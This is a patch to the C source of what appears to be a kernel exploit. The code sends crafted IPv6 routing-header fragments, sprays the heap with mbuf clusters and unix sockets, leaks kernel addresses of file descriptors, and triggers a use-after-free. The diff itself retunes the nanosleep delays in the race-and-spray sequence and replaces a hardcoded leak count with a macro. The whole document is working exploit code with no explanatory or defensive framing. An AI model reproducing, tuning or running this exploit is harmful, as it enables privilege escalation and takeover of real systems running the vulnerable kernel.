@@ -101,6 +101,7 @@ void send_shifted_fragment(int fd, char* src, size_t off, size_t sz, int is_fina
 #define SPRAY_SIZE 256
 #define NUM_UNIX 256
 #define MAX_FDS 128
+#define FD_LEAK_SIZE 80
 
 void push_mbuf(int* socks, int i)
 {
@@ -312,16 +313,20 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
         buf_unix[i] = 0;
     build_rthdr(buf, RTHDR_1_SZ);
     build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
     send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
         push_cluster(socks, i);
-        nanosleep((void*)"\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0", 0);
+        nanosleep((void*)"\0\0\0\0\0\0\0\0\x40\x42\x0f\0\0\0\0\0", 0);
+        //nanosleep((void*)"\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0", 0);
     }
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     int bad1 = -1, bad2 = -1;
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
@@ -403,16 +408,20 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
         buf_unix[i] = 0;
     build_rthdr(buf, RTHDR_1_SZ);
     build_rthdr(buf + RTHDR_1_SZ, RTHDR_2_SZ);
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
     send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
         push_cluster(socks, i);
-        nanosleep((void*)"\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0", 0);
+        nanosleep((void*)"\0\0\0\0\0\0\0\0\x40\x42\x0f\0\0\0\0\0", 0);
+        //nanosleep((void*)"\0\0\0\0\0\0\0\0\x80\x96\x98\0\0\0\0\0", 0);
     }
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     int bad1 = -1, bad2 = -1;
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
@@ -436,7 +445,8 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
     buf[4] = buf[5] = buf[6] = buf[7] = 0x41;
     for(int i = 0; i < NUM_UNIX; i++)
         send_shifted_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xfee10000+i, 60);
-    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    //nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
+    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     //print_mbuf_addr(socks[bad2]);
     recvfrom(socks[bad2], buf_final, sizeof(buf_final), MSG_DONTWAIT|MSG_PEEK, 0, 0);
     int uaf_idx = __builtin_bswap32(*(unsigned int*)(buf_final+276));
@@ -617,10 +627,10 @@ int main()
         path[i+1] = buf[i];
     for(int i = 0; i < 256; i++)
         fd[255-i] = open(path, O_RDONLY);
-    for(int i = 80; i < 256; i++)
+    for(int i = FD_LEAK_SIZE; i < 256; i++)
         close(fd[i]);
-    uintptr_t leak[80];
-    if(leak_fds(fd, leak, 80, kp_bad_fds))
+    uintptr_t leak[FD_LEAK_SIZE];
+    if(leak_fds(fd, leak, FD_LEAK_SIZE, kp_bad_fds))
     {
         printf("leak_fds failed\n");
         return 1;
@@ -628,15 +638,15 @@ int main()
     for(int i = 0; i < 80; i++)
         printf("%d %d %p\n", i, fd[i], (void*)leak[i]);
     int low = -1, high = -1;
-    for(int i = 0; i < 80 && low < 0; i++)
+    for(int i = 0; i < FD_LEAK_SIZE && low < 0; i++)
         if((leak[i] & 255) == 0x20)
-            for(int j = 0; j < 80 && low < 0; j++)
+            for(int j = 0; j < FD_LEAK_SIZE && low < 0; j++)
                 if(leak[j] != leak[i] && (leak[j] & ~255ull) == (leak[i] & ~255ull))
                 {
                     low = i;
                     high = j;
                 }
-    for(int i = 0; i < 80; i++)
+    for(int i = 0; i < FD_LEAK_SIZE; i++)
         if(i != low && i != high)
             close(fd[i]);
     if(low < 0)
